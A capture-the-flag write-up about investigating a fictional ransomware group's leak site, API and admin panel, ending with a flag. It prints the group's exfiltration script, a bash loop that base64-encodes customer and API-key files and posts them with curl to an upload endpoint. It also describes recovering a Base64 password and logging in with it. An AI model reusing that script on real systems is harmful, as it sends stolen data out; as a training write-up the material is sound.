# 👖 Pantalones CTF — Write-up

> A CTF investigation into exposed attacker infrastructure, leaked secrets,
> poor credential handling, API enumeration, and operational security failures.

## 🎯 Objective

Investigate the Pantalones ransomware group's exposed infrastructure and
discover the hidden flag.

---

## 🧰 Skills & Techniques

- OSINT
- Web investigation
- API enumeration
- Source-code analysis
- Secret discovery
- Base64 decoding
- Credential analysis
- Authentication testing
- Threat intelligence
- Attacker OPSEC analysis

---

# 🔎 1. Initial Reconnaissance

The challenge presented a leak site containing multiple victims.

Two particularly interesting targets were:

- QuantumCore Systems
- AetherFlow Enterprises

AetherFlow was especially interesting because its leaked archive contained
not only business data but also a hidden operational script.

### Evidence
![](Screenshots/1.png)

![](Screenshots/1.1.png)

![](Screenshots/1.2.png)

---

# 🕵️ 2. Discovering the Hidden `.exfil.sh`

Inside the AetherFlow leak, I found:

```text
aetherflow/
├── api_keys_internal.yaml
├── route_algorithms_PROPRIETARY.sql
├── customers.sql
└── .exfil.sh

```

![](Screenshots/2.png)

# 🕵️ 3. Analysis .exfil.sh

The script revealed information about how the attackers were transferring
stolen files to their infrastructure.

It contained:

- A panel address
- An API endpoint
- An authentication header
- An upload action
- A list of files being exfiltrated
- Base64 encoding of file contents

A sanitized representation of the relevant logic looked like:

```

#!/bin/bash
# aetherflow staging dump - vex 05/30
PANEL="[REDACTED]"
KEY="[REDACTED]"

TARGETS=(
    "route_algorithms_PROPRIETARY.sql"
    "customers.sql"
    "api_keys_internal.yaml"
)

for f in "${TARGETS[@]}"; do
    [ -f "$f" ] || continue
    # dont upload ourselves lol
    [ "$f" = ".exfil.sh" ] && continue
    b64=$(base64 -w0 "$f")
    curl -s -X POST "${PANEL}/api.php?action=upload" \
        -H "X-Panel-Key: ${KEY}" \
        -d "chunk=${b64}&fname=${f}&tag=aetherflow"
    echo "[+] sent: $f"
done

# TODO: delete this before zipping

```

---

# 🌐 4. API Investigation

After identifying the API endpoint from the leaked script, I investigated
the available functionality.

The API revealed several actions:

- upload
- status
- messages
- decrypt
- wallets
- payloads
- exfil

The API became an important source of threat intelligence.

I focused on information-gathering functionality rather than destructive
operations.

![](Screenshots/3.png)

---



# 💬 9. Internal Attacker Messages

The messages functionality was particularly valuable.

The exposed conversations contained information about:

- Victims
- Attack timelines
- Exfiltration operations
- Internal roles
- Ransom demands
- Infrastructure mistakes
- Credential handling
- Attacker concerns about OPSEC

The messages effectively provided an insider view of the operation.

![](Screenshots/

---

# 🔐 10. Credential Discovery

While investigating the internal messages, I found another interesting
conversation.

One attacker asked another for their FTP password after resetting their
machine.

Instead of using a secure password manager, the password was shared in the
conversation in encoded form.

The value looked like:

[REDACTED_BASE64_VALUE]

The attacker described it as "encoded."

This immediately suggested Base64.

![](Screenshots/4.png)

---

# 🧪 11. Base64 Decoding

I decoded the value using CyberChef.

The important observation was that the value was encoded, not encrypted.

Base64

Base64 is a binary-to-text encoding scheme.

It does not provide confidentiality.

Anyone who obtains a Base64-encoded password can decode it.

Example
Encoded data
     ↓
Base64 decode
     ↓
Original plaintext

This recovered the password associated with the attacker account.

![](Screenshots/13.png)

---

# 🚪 12. Discovering the Admin Panel

The Pantalones site contained an administrative interface:

admin panel


Username
Password


Authenticate

The attacker conversations had already revealed information about their
credential practices.

Using the credentials discovered during the CTF investigation, I tested
authentication against the challenge's admin panel.

The credentials were accepted.

![](Screenshots/14.png)

---

# 🖥️ 13. Admin Panel Access

After successful authentication, I reached the administrative interface.

This was the final major step in the investigation.

The important point was that the admin compromise did not require a
sophisticated exploit.

Instead, the access chain resulted from:

Poor OPSEC
     +
Credential sharing
     +
Weak encoding
     +
Exposed infrastructure

![](Screenshots/15.png)

---

# 🏁 14. Finding the Flag

The final flag was located inside the administrative panel.

🎯 Flag

```
flare{pantal0n3s_g0t_pantsed_2026}
```
![](Screenshots/8.png)
